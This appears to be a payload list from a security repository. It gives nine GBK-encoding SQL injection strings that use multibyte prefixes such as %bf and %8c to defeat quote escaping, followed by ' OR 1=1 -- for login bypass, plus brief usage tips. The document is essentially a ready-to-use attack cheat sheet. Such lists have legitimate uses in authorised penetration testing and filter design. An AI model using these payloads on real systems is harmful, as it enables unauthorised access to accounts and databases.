## SQLi_GBK-Encode_Payloads

##### Note: In all these payloads, we can put user or not, but the space after "--" characters must be observed and we can use other command characters instead of "--" characters.

##### Note2:In some sites, you have to be creative and fill in the password to get the "True" answer

### Payloads:

    Payload: <Username>%bf' OR 1=1 -- &password=
    Payload: <Username>%aa' OR 1=1-- &password=
    Payload: <Username> %af' OR 1=1-- &password=
    Payload: <Username>%a8' OR 1=1--  &password=
    Payload: <Username>%8c' OR 1=1--  &password=
    Payload: <Username>0x8c╘' OR 1=1; -- &password=
    Payload: <Username>%bf%5c' OR 1=1; -- &password=
    Payload: <Username>呵’ or 1=1 -- &password=
    Payload: <Username>¿' or 1=1 -- &password=
